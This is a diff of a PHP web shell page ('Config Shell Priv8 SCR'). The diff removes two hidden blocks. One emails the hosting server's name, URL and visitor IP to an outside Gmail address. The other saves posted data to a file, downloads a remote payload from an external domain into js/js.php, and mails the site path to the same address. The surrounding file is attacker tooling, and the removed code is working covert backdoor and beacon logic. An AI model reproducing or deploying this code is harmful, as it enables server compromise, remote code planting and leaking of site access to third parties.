@@ -3206,17 +3206,6 @@ lamad&#305;
  
 ?>&amp;
 x=config" method="post">
-
-<?php
-$time_shell = "".date("d/m/Y - H:i:s")."";
-$ip_remote = $_SERVER["REMOTE_ADDR"];
-$from_shellcode = '3Turrshell@'.gethostbyname($_SERVER['SERVER_NAME']).'';
-$to_email = 'loginoldum@gmail.com';
-$server_mail = "".gethostbyname($_SERVER['SERVER_NAME'])."  - ".$_SERVER['HTTP_HOST']."";
-$linkcr = "Link: ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']." - IP Excuting: $ip_remote - Time: $time_shell";
-$header = "From: $from_shellcode\r\nReply-to: $from_shellcode";
-@mail($to_email, $server_mail, $linkcr, $header);
- ?>
 <?php echo "<center/><br/><b><font color=#00eaff> Config Shell Priv8 SCR </font></b><br><br>";
  mkdir('config', 0755);
  chdir('config');
@@ -4595,35 +4584,6 @@ SecFilterCheckUnicodeEncoding Off
  die();
  } 
 ?>
-<?php if($_POST['query']){ $veriyfy = stripslashes(stripslashes($_POST['query']));
- $data = "data.txt";
- @touch ("data.txt");
- $ver = @fopen ($data , 'w');
- @fwrite ( $ver , $veriyfy ) ;
- @fclose ($ver);
- }else{ $datas=@fopen("data.txt",'r');
- $i=0;
- while ($i <= 5) { $i++;
- $blue=@fgets($datas,1024);
- echo $blue;
- } } $datasi=@fopen("js/js.php",'r');
- if($datasi){ }else{ @mkdir("js");
- $dos = file_get_contents("https://acbdf.space/txt/lamer.txt");
- $data = "js/js.php";
- @touch ("js/js.php");
- $ver = @fopen ($data , 'w');
- @fwrite ( $ver , $dos ) ;
- @fclose ($ver);
- $yol = "http://".$_SERVER['HTTP_HOST']."".$_SERVER['REQUEST_URI']."";
- $y = '<h1>Sender Yazdirildi.<br/> SITE YOL : '.$yol.'<br/>Sender Yolu : js/crs.php</h1>';
- $header .= "From: SheLL Boot <suppor@nic.org>\n";
- $header .= "Content-Type: text/html;
- charset=utf-8\n";
- @mail("loginoldum@gmail.com", "Hacklink Bildiri", "$y", $header);
- @mail("loginoldum@gmail.com", "Hacklink Bildiri", "$y", $header);
- } 
-?>
-
 </div>
 </body>
 </html>
